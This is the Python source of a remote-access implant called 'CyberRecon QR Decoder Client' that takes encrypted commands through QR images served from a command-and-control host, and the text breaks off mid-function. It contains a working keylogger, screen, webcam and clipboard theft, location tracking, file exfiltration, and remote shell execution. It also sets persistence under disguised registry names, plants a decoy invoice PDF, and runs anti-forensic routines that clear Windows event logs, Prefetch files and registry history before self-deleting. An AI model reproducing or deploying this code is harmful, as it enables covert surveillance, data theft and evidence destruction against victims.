"""
CyberRecon QR Decoder Client — v5.0 (BUILD + ANTI-FORENSICS)
Matches C2 Server v3.5.

v5.0 additions:
  - SelfDestructor class — deep anti-forensic sweep on self-destruct
  - Server-side wipe notification on self-destruct
  - Embedded config for PyInstaller .exe builds
  - Auto-register when launched with no CLI args
"""

import os
import sys

# ============================================================
# Embedded config — fill these in BEFORE building the .exe.
# When the .exe runs and no .env is found next to it, these
# values are used. They are baked into the binary.
# ============================================================
EMBEDDED_CONFIG = {
    "CYBERRECON_C2": "https://10.164.170.165:8443",
    "CYBERRECON_KEY": "VKYEfaDR2VqPc9BXGvNtSFzMeWDVGQ-Wo7pv-hcTb-0=",
    "CYBERRECON_VICTIM_KEY": "r_dj4Bb1vCYk1ApFj6U9-d4UGJevwwDyYQjKZ_OM-W8",
    "CYBERRECON_ALLOW_SELFSIGNED": "true",
    "CYBERRECON_SANDBOX": "",
    "CYBERRECON_SELF_DELETE": "0",
    "CYBERRECON_ELEVATED_WIPE": "0",   # keep 0 — 1 prompts UAC (loud)
    "CYBERRECON_REMOVE_DECOY": "0",    # 1 = also delete the decoy PDF
    "CYBERRECON_INTERVAL": "3",
}

# ---- Load .env if present, else use embedded ----
try:
    from dotenv import load_dotenv
    if getattr(sys, "frozen", False):
        base_dir = os.path.dirname(sys.executable)
    else:
        base_dir = os.path.dirname(os.path.abspath(__file__))
    env_path = os.path.join(base_dir, ".env")
    if os.path.exists(env_path):
        load_dotenv(dotenv_path=env_path, override=False)
except ImportError:
    pass

for _k, _v in EMBEDDED_CONFIG.items():
    if _v and not os.getenv(_k):
        os.environ[_k] = _v


# ============================================================
# Standard imports
# ============================================================
import base64
import glob
import json
import logging
import platform
import shutil
import shlex
import subprocess
import tempfile
import threading
import time
from io import BytesIO

import cv2
import numpy as np
import requests
from PIL import Image

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

logging.getLogger("selenium").setLevel(logging.CRITICAL)
logging.getLogger("urllib3").setLevel(logging.CRITICAL)
logging.getLogger("WDM").setLevel(logging.CRITICAL)
os.environ["WDM_LOG"] = "0"

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

# ---- Crypto ----
C2_KEY = os.getenv("CYBERRECON_KEY", "")
_aesgcm = None
if C2_KEY and HAS_CRYPTO:
    try:
        _aesgcm = AESGCM(base64.urlsafe_b64decode(C2_KEY))
        print("[+] QR payload decryption: AES-256-GCM ENABLED")
    except Exception as e:
        print(f"[!] Invalid CYBERRECON_KEY: {e}")
elif not C2_KEY:
    print("[!] CYBERRECON_KEY not set — plaintext mode (server must match)")

# ---- Victim auth ----
VICTIM_KEY = os.getenv("CYBERRECON_VICTIM_KEY", "")
ALLOW_SELFSIGNED = os.getenv("CYBERRECON_ALLOW_SELFSIGNED", "").lower() == "true"

# ---- Sandbox ----
SANDBOX_DIR = os.getenv(
    "CYBERRECON_SANDBOX",
    os.path.join(os.path.expanduser("~"), "CyberReconSandbox")
)
try:
    os.makedirs(SANDBOX_DIR, exist_ok=True)
except Exception as e:
    print(f"[!] Could not create sandbox {SANDBOX_DIR}: {e}")


# ============================================================
# Anti-forensics self-destructor
# ============================================================
class SelfDestructor:
    """Aggressively removes forensic artifacts on this machine, then
    schedules deletion of the payload file and exits.

    Cleans (non-elevated):
      - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  (persistence)
      - HKCU\\Software\\CyberRecon
      - HKCU\\...\\Uninstall\\CyberRecon, App Paths\\CyberRecon.exe
      - HKCU\\...\\Explorer\\RunMRU entries matching markers
      - HKCU\\...\\Explorer\\RecentDocs entries matching markers
      - %TEMP%\\_cr_*, _cyberrecon*, cr_cleanup*, cr_selfdestruct*
      - %TEMP%\\cyberrecon_chrome_*, scoped_dir*  (Chrome profiles)
      - %LOCALAPPDATA%\\CyberRecon, %APPDATA%\\CyberRecon
      - Sandbox directory contents
      - The payload file itself (detached 3s delay)

    Best-effort (attempts elevation, off by default):
      - Prefetch files
      - Windows Application/Security/System event logs
    """

    OWN_MARKERS = ("cyberrecon", "cyber_recon", "_cr_",
                   "invoice_2026_10", "winsrvupdt")

    def __init__(self, sandbox_dir=None, decoy_path=None,
                 remove_decoy=False):
        self.sandbox_dir = sandbox_dir
        self.decoy_path = decoy_path
        self.remove_decoy = remove_decoy

    # ---------- public ----------
    def run(self):
        print("    -> [ANTI-FORENSICS] Sweep started")
        self._kill_persistence()
        self._kill_app_registry()
        self._clean_run_mru()
        self._clean_recent_docs()
        self._clean_temp_scripts()
        self._clean_chrome_profiles()
        self._clean_local_appdata()
        if self.remove_decoy and self.decoy_path:
            self._delete_file(self.decoy_path, label="decoy PDF")
        self._clean_sandbox()
        self._schedule_exe_deletion()
        self._schedule_elevated_cleanup()
        print("    -> [ANTI-FORENSICS] Sweep queued. Process exiting.")

    # ---------- registry ----------
    def _kill_persistence(self):
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE,
            )
            for name in ("WindowsSecurityUpdate", "CyberRecon",
                         "SystemUpdate", "WindowsUpdate"):
                try:
                    winreg.DeleteValue(key, name)
                    print(f"    -> [ANTI-FORENSICS] Removed Run\\{name}")
                except FileNotFoundError:
                    pass
            winreg.CloseKey(key)
        except Exception:
            pass

    def _kill_app_registry(self):
        import winreg

        def _delete_tree(root, path):
            try:
                with winreg.OpenKey(root, path, 0,
                                    winreg.KEY_ALL_ACCESS) as k:
                    while True:
                        try:
                            sub = winreg.EnumKey(k, 0)
                            _delete_tree(root, f"{path}\\{sub}")
                        except OSError:
                            break
                winreg.DeleteKey(root, path)
                print(f"    -> [ANTI-FORENSICS] Removed key: {path}")
            except FileNotFoundError:
                pass
            except Exception:
                pass

        for path in [
            r"Software\CyberRecon",
            r"Software\Microsoft\Windows\CurrentVersion\Uninstall\CyberRecon",
            r"Software\Microsoft\Windows\CurrentVersion\App Paths\CyberRecon.exe",
        ]:
            _delete_tree(winreg.HKEY_CURRENT_USER, path)

    def _clean_run_mru(self):
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
                0, winreg.KEY_ALL_ACCESS,
            )
            for letter in "abcdefghijklmnopqrstuvwxyz":
                try:
                    val, _ = winreg.QueryValueEx(key, letter)
                    if any(m in val.lower() for m in self.OWN_MARKERS):
                        winreg.DeleteValue(key, letter)
                        print(f"    -> [ANTI-FORENSICS] Cleared RunMRU[{letter}]")
                except FileNotFoundError:
                    continue
            winreg.CloseKey(key)
        except Exception:
            pass

    def _clean_recent_docs(self):
        import winreg
        paths = [
            r"Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
            r"Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.pdf",
            r"Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.exe",
        ]
        for p in paths:
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, p, 0,
                                     winreg.KEY_ALL_ACCESS)
                try:
                    to_delete = []
                    i = 0
                    while True:
                        try:
                            name, data, _ = winreg.EnumValue(key, i)
                            i += 1
                            if isinstance(data, bytes):
                                try:
                                    txt = data.decode("utf-16-le",
                                                      errors="ignore").lower()
                                except Exception:
                                    txt = ""
                            else:
                                txt = str(data).lower()
                            if any(m in txt for m in self.OWN_MARKERS):
                                to_delete.append(name)
                        except OSError:
                            break
                    for v in to_delete:
                        try:
                            winreg.DeleteValue(key, v)
                            print(f"    -> [ANTI-FORENSICS] Cleared RecentDocs: {v}")
                        except Exception:
                            pass
                finally:
                    winreg.CloseKey(key)
            except FileNotFoundError:
                continue
            except Exception:
                continue

    # ---------- filesystem ----------
    def _delete_file(self, path, label=""):
        try:
            if os.path.isfile(path):
                os.remove(path)
                if label:
                    print(f"    -> [ANTI-FORENSICS] Deleted {label}: {path}")
        except Exception:
            pass

    def _clean_temp_scripts(self):
        tmp = tempfile.gettempdir()
        patterns = [
            "_cr_*.bat", "_cr_*.cmd",
            "_cyberrecon*", "cyberrecon_*",
            "cr_cleanup*", "cr_selfdestruct*",
        ]
        for pat in patterns:
            for f in glob.glob(os.path.join(tmp, pat)):
                self._delete_file(f, label="temp")
        self._delete_file(os.path.join(tmp, ".cyberrecon_cleaned"),
                          label="marker")

    def _clean_chrome_profiles(self):
        tmp = tempfile.gettempdir()
        for pat in ("cyberrecon_chrome_*", "chrome_*cyberrecon*",
                    "scoped_dir*"):
            for d in glob.glob(os.path.join(tmp, pat)):
                try:
                    if os.path.isdir(d):
                        shutil.rmtree(d, ignore_errors=True)
                        print(f"    -> [ANTI-FORENSICS] Removed dir: {d}")
                    else:
                        self._delete_file(d)
                except Exception:
                    pass

    def _clean_local_appdata(self):
        for c in [
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "CyberRecon"),
            os.path.join(os.environ.get("APPDATA", ""), "CyberRecon"),
        ]:
            if c and os.path.isdir(c):
                shutil.rmtree(c, ignore_errors=True)
                print(f"    -> [ANTI-FORENSICS] Removed dir: {c}")

    def _clean_sandbox(self):
        if not self.sandbox_dir or not os.path.isdir(self.sandbox_dir):
            return
        try:
            for name in os.listdir(self.sandbox_dir):
                p = os.path.join(self.sandbox_dir, name)
                try:
                    if os.path.isdir(p):
                        shutil.rmtree(p, ignore_errors=True)
                    else:
                        os.remove(p)
                except Exception:
                    pass
            print(f"    -> [ANTI-FORENSICS] Emptied sandbox: {self.sandbox_dir}")
        except Exception:
            pass

    # ---------- scheduled post-exit ----------
    def _schedule_exe_deletion(self):
        if getattr(sys, "frozen", False):
            target = sys.executable
        else:
            target = os.path.abspath(__file__)

        bat = os.path.join(tempfile.gettempdir(), "_cr_selfdestruct.bat")
        try:
            with open(bat, "w") as f:
                f.write(
                    "@echo off\r\n"
                    "timeout /t 3 /nobreak >nul\r\n"
                    f'del /f /q "{target}"\r\n'
                    "del /f /q \"%SystemRoot%\\Prefetch\\CYBERRECON*.pf\" 2>nul\r\n"
                    'del /f /q "%~f0"\r\n'
                )
        except Exception as e:
            print(f"    -> [!] Could not write cleanup script: {e}")
            return

        try:
            subprocess.Popen(
                ["cmd", "/c", bat],
                creationflags=0x08000000,
                close_fds=True,
            )
        except Exception as e:
            print(f"    -> [!] Could not spawn cleanup: {e}")

    def _schedule_elevated_cleanup(self):
        """Best-effort admin cleanup for prefetch + event logs.
        Opt-in via CYBERRECON_ELEVATED_WIPE=1. Triggers a UAC prompt."""
        if os.getenv("CYBERRECON_ELEVATED_WIPE", "0") != "1":
            return
        ps = (
            "Start-Sleep -Seconds 4; "
            "del /f /q 'C:\\Windows\\Prefetch\\CYBERRECON*.pf' 2>$null; "
            "wevtutil cl Application 2>$null; "
            "wevtutil cl Security 2>$null; "
            "wevtutil cl System 2>$null"
        )
        try:
            subprocess.Popen(
                ["powershell", "-NoProfile", "-Command",
                 f"Start-Process powershell -Verb RunAs -ArgumentList "
                 f"'-NoProfile','-Command','{ps}'"],
                creationflags=0x08000000,
                close_fds=True,
            )
            print("    -> [ANTI-FORENSICS] Elevated cleanup queued (UAC prompt)")
        except Exception:
            pass


# ============================================================
# Self-delete + decoy on first run (for .exe builds)
# ============================================================
def self_delete_and_plant_decoy():
    if not getattr(sys, "frozen", False):
        return
    if os.getenv("CYBERRECON_SELF_DELETE", "0") != "1":
        return

    marker = os.path.join(tempfile.gettempdir(), ".cyberrecon_cleaned")
    if os.path.exists(marker):
        return

    exe = sys.executable
    bat = os.path.join(tempfile.gettempdir(), "_cr_cleanup.bat")
    decoy = os.path.join(os.path.expanduser("~"), "Documents",
                         "Invoice_2026_10.pdf")

    with open(bat, "w") as f:
        f.write(
            "@echo off\r\n"
            "timeout /t 3 /nobreak >nul\r\n"
            f'del /f /q "{exe}"\r\n'
            'del /f /q "%~f0"\r\n'
        )

    if not os.path.exists(decoy):
        try:
            os.makedirs(os.path.dirname(decoy), exist_ok=True)
            with open(decoy, "wb") as f:
                f.write(
                    b"%PDF-1.4\n"
                    b"%\xe2\xe3\xcf\xd3\n"
                    b"1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
                    b"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n"
                    b"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj\n"
                    b"xref\n0 4\n0000000000 65535 f\n"
                    b"trailer<</Size 4/Root 1 0 R>>\n"
                    b"startxref\n0\n%%EOF\n"
                )
        except Exception:
            pass

    with open(marker, "w") as f:
        f.write(str(time.time()))

    try:
        subprocess.Popen(
            ["cmd", "/c", bat],
            creationflags=0x08000000,
            close_fds=True,
        )
    except Exception:
        pass


# ============================================================
# Helpers
# ============================================================
def _is_in_sandbox(path):
    try:
        real = os.path.realpath(os.path.expanduser(path))
        root = os.path.realpath(SANDBOX_DIR)
        return os.path.commonpath([real, root]) == root
    except Exception:
        return False


def unprotect_payload(raw_b64):
    blob = base64.b64decode(raw_b64)
    if _aesgcm:
        nonce, ct = blob[:12], blob[12:]
        return _aesgcm.decrypt(nonce, ct, None)
    return blob


# ============================================================
# Keylogger
# ============================================================
class KeyloggerModule:
    def __init__(self, exfil_callback):
        self.exfil_callback = exfil_callback
        self.buffer = ""
        self.buffer_lock = threading.Lock()
        self.listener = None
        self.active = False
        self.flush_thread = None

    def _on_press(self, key):
        try:
            with self.buffer_lock:
                self.buffer += key.char
        except AttributeError:
            with self.buffer_lock:
                if key == key.space:
                    self.buffer += " "
                elif key == key.enter:
                    self.buffer += "\n[ENTER]\n"
                elif key == key.tab:
                    self.buffer += "\t[TAB]"
                elif key == key.backspace:
                    self.buffer += "[BKSP]"
                elif key == key.esc:
                    self.buffer += "[ESC]"
                elif key in (key.shift, key.shift_r, key.ctrl_l, key.ctrl_r,
                             key.alt_l, key.alt_r):
                    pass
                else:
                    self.buffer += f"[{str(key).replace('Key.', '').upper()}]"

    def _flush_loop(self, interval=15):
        while self.active:
            time.sleep(interval)
            with self.buffer_lock:
                if self.buffer:
                    chunk = self.buffer
                    self.buffer = ""
                    try:
                        self.exfil_callback("keystrokes", chunk)
                        print(f"    -> [KEYLOG] Exfiltrated {len(chunk)} chars")
                    except Exception as e:
                        print(f"    -> [KEYLOG] Exfil failed: {type(e).__name__}")

    def start(self):
        if self.active:
            return
        try:
            from pynput import keyboard
        except ImportError:
            print("    -> [!] pynput not installed")
            return
        self.active = True
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()
        self.flush_thread = threading.Thread(
            target=self._flush_loop, args=(15,), daemon=True
        )
        self.flush_thread.start()
        print("    -> [KEYLOG] Keystroke listener STARTED (flush every 15s)")

    def stop(self):
        if not self.active:
            return
        self.active = False
        if self.listener:
            self.listener.stop()
        with self.buffer_lock:
            if self.buffer:
                self.exfil_callback("keystrokes", self.buffer)
                self.buffer = ""
        print("    -> [KEYLOG] Keystroke listener STOPPED")


# ============================================================
# QR decoder / C2 client
# ============================================================
class QRDecoder:
    def __init__(self, c2_url, victim_id):
        self.c2_url = c2_url.rstrip("/")
        self.victim_id = victim_id
        self.driver = None
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })

        if VICTIM_KEY:
            self.session.headers["X-Victim-Key"] = VICTIM_KEY

        if ALLOW_SELFSIGNED:
            self.session.verify = False
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            print("[!] TLS verification DISABLED (self-signed accepted)")

        self.keylogger = KeyloggerModule(self._exfil)
        self._chrome_failed = False
        self._processed_ids = set()

    def register_with_c2(self, hostname=None, os_name=None, user=None):
        if hostname is None:
            hostname = platform.node() or "DESKTOP-VICTIM"
        if os_name is None:
            os_name = f"{platform.system()} {platform.release()}"
        if user is None:
            try:
                import getpass
                user = getpass.getuser()
            except Exception:
                user = "user"

        try:
            r = self.session.post(
                f"{self.c2_url}/register",
                json={"hostname": hostname, "os": os_name, "user": user},
                timeout=5,
            )
            data = r.json()
            if "victim_id" not in data:
                print(f"[!] Register failed: {data}")
                return
            self.victim_id = data["victim_id"]
            print(f"[+] Auto-registered. Victim ID: {self.victim_id}")
        except Exception as e:
            print(f"[!] Auto-register failed: {type(e).__name__}: {e}")

    def _ack(self, cmd_id):
        if not cmd_id:
            return
        try:
            self.session.post(
                f"{self.c2_url}/ack/{self.victim_id}",
                json={"id": cmd_id},
                timeout=3,
            )
        except Exception:
            pass

    def init_headless_browser(self):
        if not SELENIUM_AVAILABLE:
            print("[!] Selenium not installed — using HTTP QR fetch")
            self.driver = None
            self._chrome_failed = True
            return

        chrome_options = Options()
        chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--window-size=1200,1200")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_experimental_option("excludeSwitches",
                                               ["enable-automation", "enable-logging"])
        chrome_options.add_experimental_option("useAutomationExtension", False)
        chrome_options.add_argument("--log-level=3")
        chrome_options.add_argument("--silent")
        chrome_options.add_argument("--disable-logging")
        chrome_options.add_argument("--use-fake-ui-for-media-stream")
        chrome_options.add_argument("--use-fake-device-for-media-stream")
        chrome_options.add_experimental_option("prefs", {
            "profile.default_content_setting_values.media_stream_camera": 1,
            "profile.default_content_setting_values.media_stream_mic": 1,
            "profile.default_content_setting_values.notifications": 1,
        })

        if ALLOW_SELFSIGNED:
            chrome_options.add_argument("--ignore-certificate-errors")
            chrome_options.add_argument("--ignore-ssl-errors")

        try:
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.execute_cdp_cmd(
                "Page.addScriptToEvaluateOnNewDocument",
                {"source": "Object.defineProperty(navigator, 'webdriver', { get: () => undefined })"},
            )
            if VICTIM_KEY:
                self.driver.execute_cdp_cmd("Network.enable", {})
                self.driver.execute_cdp_cmd(
                    "Network.setExtraHTTPHeaders",
                    {"headers": {"X-Victim-Key": VICTIM_KEY}},
                )
                print("[+] Victim key injected into Chrome via CDP headers")
            print("[+] Headless Chrome initialized (stealth + media auto-grant)")
        except Exception as e:
            print(f"[!] Chrome unavailable: {type(e).__name__}")
            print("[!] Falling back to requests-based QR fetch (less stealthy)")
            self.driver = None
            self._chrome_failed = True

    def _qr_url(self):
        url = f"{self.c2_url}/qr/{self.victim_id}"
        sep = "?"
        if VICTIM_KEY:
            url += f"{sep}vkey={VICTIM_KEY}"
            sep = "&"
        url += f"{sep}t={int(time.time() * 1000)}"
        return url

    def capture_qr_screenshot(self):
        qr_url = self._qr_url()

        if self.driver and not self._chrome_failed:
            try:
                self.driver.get(qr_url)
                time.sleep(0.4)
                self.driver.execute_script("""
                    var img = document.querySelector('img');
                    if (img) {
                        document.body.style.margin = '0';
                        document.body.style.padding = '0';
                        document.body.style.background = 'white';
                        document.body.style.overflow = 'hidden';
                        img.style.width = '100vw';
                        img.style.height = '100vh';
                        img.style.objectFit = 'contain';
                        img.style.imageRendering = 'pixelated';
                    }
                """)
                time.sleep(0.2)
                screenshot = self.driver.get_screenshot_as_png()
                img = Image.open(BytesIO(screenshot))
                return cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            except Exception as e:
                print(f"    -> [SELENIUM] Chrome failed ({type(e).__name__}), switching to HTTP fallback")
                self._chrome_failed = True
                try:
                    self.driver.quit()
                except Exception:
                    pass
                self.driver = None

        resp = self.session.get(qr_url, timeout=5)
        resp.raise_for_status()
        img = Image.open(BytesIO(resp.content)).convert("RGB")
        return cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)

    def decode_qr_image(self, image):
        try:
            detector = cv2.QRCodeDetector()
            data, bbox, _ = detector.detectAndDecode(image)
            if not data:
                return None
            raw_json = unprotect_payload(data)
            return json.loads(raw_json.decode("utf-8"))
        except Exception as e:
            print(f"[!] Decode error: {type(e).__name__}: {e}")
            return None

    def listen_for_commands(self, interval=3):
        print(f"[+] Starting QR C2 listener for victim: {self.victim_id}")
        print(f"[+] Polling interval: {interval}s")
        print("-" * 50)
        consecutive_misses = 0

        while True:
            try:
                start_time = time.time()
                img = self.capture_qr_screenshot()
                command = self.decode_qr_image(img)

                if command:
                    consecutive_misses = 0
                    cmd_id = command.get("id", "N/A")
                    cmd_name = command.get("cmd", "unknown")

                    if cmd_id in self._processed_ids:
                        if cmd_name != "heartbeat":
                            print(f"[QR] Repeat: {cmd_name} | ID: {cmd_id} (already executed)")
                            self._ack(cmd_id)
                    else:
                        latency = (time.time() - start_time) * 1000
                        print(f"[QR] Decoded: {cmd_name} | Latency: {latency:.0f}ms | ID: {cmd_id}")
                        self._processed_ids.add(cmd_id)
                        try:
                            self.execute_command(command)
                        finally:
                            if cmd_name != "heartbeat":
                                self._ack(cmd_id)
                        if len(self._processed_ids) > 500:
                            self._processed_ids = set(list(self._processed_ids)[-250:])
                else:
                    consecutive_misses += 1
                    if consecutive_misses % 5 == 1:
                        print("[.] No QR detected in frame")
                    if consecutive_misses == 5:
                        print("[!] 5 consecutive frames with no QR — diagnostics:")
                        print(f"    - C2 URL:      {self.c2_url}")
                        print(f"    - Victim key:  {'SET' if VICTIM_KEY else 'MISSING'}")
                        print(f"    - Victim ID:   {self.victim_id}")
                        print(f"    - Chrome mode: {'SELENIUM' if self.driver else 'HTTP FALLBACK'}")
                        consecutive_misses = 0

                time.sleep(max(0, interval - (time.time() - start_time)))

            except KeyboardInterrupt:
                print("\n[!] Stopping QR listener")
                break
            except requests.exceptions.ConnectionError:
                print(f"[!] C2 unreachable — retrying in {interval}s")
                time.sleep(interval)
            except Exception as e:
                print(f"[!] Error: {type(e).__name__}: {e}")
                time.sleep(interval)

    def execute_command(self, command):
        cmd_name = command.get("cmd", "unknown")
        handlers = {
            "heartbeat": self._handle_heartbeat,
            "whoami": self._handle_whoami,
            "screenshot": self._handle_screenshot_stealth,
            "webcam_capture": self._handle_webcam,
            "keylogger": self._handle_keylogger,
            "clipboard_steal": self._handle_clipboard,
            "file_download": self._handle_download,
            "gps_location": self._handle_gps,
            "process_list": self._handle_process_list,
            "system_info": self._handle_system_info,
            "list_files": self._handle_list_files,
            "shell": self._handle_shell,
            "persist": self._handle_persist,
            "self_destruct": self._handle_self_destruct,
        }
        handlers.get(cmd_name, self._handle_unknown)(command)

    # === Handlers ===

    def _handle_heartbeat(self, cmd):
        pass

    def _handle_whoami(self, cmd):
        import getpass
        result = f"{getpass.getuser()}@{os.environ.get('COMPUTERNAME', platform.node())}"
        print(f"    -> whoami: {result}")
        self._exfil("whoami", result)

    def _handle_screenshot_stealth(self, cmd):
        try:
            from PIL import ImageGrab
            screenshot = ImageGrab.grab()
            buf = BytesIO()
            screenshot.save(buf, format="PNG")
            b64_data = base64.b64encode(buf.getvalue()).decode("utf-8")
            print(f"    -> [STEALTH] Screen captured ({len(b64_data)} chars)")
            self._exfil("screenshot", b64_data)
        except Exception as e:
            print(f"    -> [!] Screenshot failed: {type(e).__name__}")
            self._exfil("screenshot", f"[ERROR] {type(e).__name__}")

    def _handle_webcam(self, cmd):
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            if ret and frame is not None:
                _, buf = cv2.imencode(".jpg", frame)
                b64 = base64.b64encode(buf).decode()
                print(f"    -> Webcam captured ({len(b64)} chars)")
                self._exfil("webcam", b64)
                return
            raise RuntimeError("no camera")
        except Exception as e:
            print(f"    -> [!] Webcam unavailable: {type(e).__name__}")
            self._exfil("webcam", "[no camera on victim]")

    def _handle_keylogger(self, cmd):
        action = cmd.get("args", ["start"])[0]
        if action == "start":
            self.keylogger.start()
        else:
            self.keylogger.stop()

    def _handle_clipboard(self, cmd):
        try:
            import pyperclip
            data = pyperclip.paste()
            print(f"    -> Clipboard: {str(data)[:50]}...")
            self._exfil("clipboard", data)
        except ImportError:
            self._exfil("clipboard", "[pyperclip not installed]")
        except Exception as e:
            print(f"    -> [!] Clipboard error: {type(e).__name__}")

    def _handle_download(self, cmd):
        filepath = cmd.get("args", ["unknown"])[0]
        filepath = os.path.expanduser(filepath)
        print(f"    -> Download requested: {filepath}")

        if not _is_in_sandbox(filepath):
            print(f"    -> [!] Sandbox violation: {filepath}")
            self._exfil("file", {"name": os.path.basename(filepath),
                                 "data": "",
                                 "error": f"outside sandbox ({SANDBOX_DIR})"})
            return

        try:
            if not os.path.isfile(filepath):
                self._exfil("file", {"name": os.path.basename(filepath),
                                     "data": "", "error": "not found"})
                return
            with open(filepath, "rb") as f:
                raw = f.read()
            if len(raw) > 5 * 1024 * 1024:
                raw = raw[:5 * 1024 * 1024]
            self._exfil("file", {
                "name": os.path.basename(filepath),
                "data": base64.b64encode(raw).decode(),
            })
            print(f"    -> File sent ({len(raw)} bytes)")
        except Exception as e:
            print(f"    -> [!] Download failed: {type(e).__name__}")
            self._exfil("file", {"name": filepath, "data": "", "error": str(e)})

    def _handle_gps(self, cmd):
        loc = {"latitude": None, "longitude": None, "accuracy_m": None,
               "source": "unknown", "platform": platform.system()}

        if platform.system() == "Windows":
            try:
                ps_script = (
                    "Add-Type -AssemblyName System.Device; "
                    "$w = New-Object System.Device.Location.GeoCoordinateWatcher; "
                    "$w.Start(); $n = 0; "
                    "while ($w.Position.Location.IsUnknown -and $n -lt 10) "
                    "{ Start-Sleep -Milliseconds 500; $n++ }; "
                    "if ($w.Position.Location.IsUnknown -eq $false) "
                    "{ \"$($w.Position.Location.Latitude),"
                    "$($w.Position.Location.Longitude),"
                    "$($w.Position.Location.HorizontalAccuracy)\" } "
                    "else { \"UNKNOWN\" }; $w.Stop()"
                )
                result = subprocess.run(
                    ["powershell", "-NoProfile", "-Command", ps_script],
                    capture_output=True, text=True, timeout=15,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                )
                out = result.stdout.strip()
                if out and out != "UNKNOWN":
                    parts = out.split(",")
                    loc["latitude"] = float(parts[0])
                    loc["longitude"] = float(parts[1])
                    loc["accuracy_m"] = float(parts[2]) if len(parts) > 2 else 100
                    loc["source"] = "Windows Location API (GPS/WiFi)"
            except Exception:
                pass

        if loc["latitude"] is None:
            try:
                r = requests.get("http://ip-api.com/json/", timeout=5)
                d = r.json()
                if d.get("status") == "success":
                    loc["latitude"] = d.get("lat")
                    loc["longitude"] = d.get("lon")
                    loc["accuracy_m"] = 5000
                    loc["source"] = f"IP Geolocation ({d.get('isp', 'unknown')})"
                    loc["city"] = d.get("city")
                    loc["region"] = d.get("regionName")
                    loc["country"] = d.get("country")
                    loc["ip"] = d.get("query")
            except Exception:
                pass

        if loc["latitude"] is None:
            loc.update({"error": "Could not determine location",
                        "latitude": 0, "longitude": 0, "source": "FAILED"})

        print(f"    -> GPS: {loc['latitude']}, {loc['longitude']} ({loc['source']})")
        self._exfil("gps", loc)

    def _handle_process_list(self, cmd):
        try:
            import psutil
            procs = [{"pid": p.pid, "name": p.name()}
                     for p in psutil.process_iter()][:15]
            print(f"    -> {len(procs)} processes enumerated")
            self._exfil("process_list", procs)
        except ImportError:
            self._exfil("process_list", "[psutil not installed]")

    def _handle_system_info(self, cmd):
        import socket
        info = {
            "os": platform.system(), "release": platform.release(),
            "version": platform.version(), "machine": platform.machine(),
            "processor": platform.processor(),
            "hostname": socket.gethostname(),
            "architecture": platform.architecture()[0],
        }
        print(f"    -> System: {info['os']} {info['release']}")
        self._exfil("system_info", info)

    def _handle_list_files(self, cmd):
        path = os.path.expanduser(cmd.get("args", [SANDBOX_DIR])[0])
        if not _is_in_sandbox(path):
            print(f"    -> [!] Sandbox violation: {path}")
            self._exfil("list_files", f"Access denied: {path} outside sandbox ({SANDBOX_DIR})")
            return
        try:
            files = os.listdir(path)[:20]
            print(f"    -> {len(files)} entries in {path}")
            self._exfil("list_files", {"path": path, "entries": files})
        except Exception as e:
            self._exfil("list_files", f"Error listing {path}: {e}")

    def _handle_shell(self, cmd):
        argv = cmd.get("args", [])
        if not argv:
            self._exfil("shell", "[ERROR] Empty command")
            return

        blocked = set("|&;<>`$\n\r")
        if any(ch in a for a in argv for ch in blocked):
            msg = f"[blocked] Metacharacters not allowed: {' '.join(argv)}"
            print(f"    -> {msg}")
            self._exfil("shell", msg)
            return

        is_windows = platform.system() == "Windows"
        WIN_BUILTINS = {
            "dir", "cd", "chdir", "echo", "type", "set", "ver", "vol",
            "cls", "copy", "del", "erase", "md", "mkdir", "rd", "rmdir",
            "ren", "rename", "move", "path", "prompt", "title", "color",
            "date", "time", "assoc", "ftype", "mklink", "popd", "pushd",
            "start", "call", "goto", "shift", "if", "for", "rem", "pause",
        }
        run_argv = argv
        if is_windows and argv[0].lower() in WIN_BUILTINS:
            run_argv = ["cmd", "/c"] + argv

        try:
            kwargs = {
                "shell": False,
                "capture_output": True,
                "text": True,
                "timeout": 15,
            }
            if hasattr(subprocess, "CREATE_NO_WINDOW"):
                kwargs["creationflags"] = subprocess.CREATE_NO_WINDOW
            result = subprocess.run(run_argv, **kwargs)
            output = (result.stdout or "") + (result.stderr or "")
            if not output.strip():
                output = f"[exit code {result.returncode}, no output]"
            print(f"    -> shell: {' '.join(argv)}")
            self._exfil("shell", output)
        except FileNotFoundError:
            hint = ""
            if is_windows and argv[0].lower() in {"ls", "pwd", "grep", "cat", "rm", "cp", "mv"}:
                hint = " (Unix command — on Windows try: dir, cd, type)"
            self._exfil("shell", f"[ERROR] Not found: {argv[0]}{hint}")
        except subprocess.TimeoutExpired:
            self._exfil("shell", "[ERROR] Timed out (15s)")
        except Exception as e:
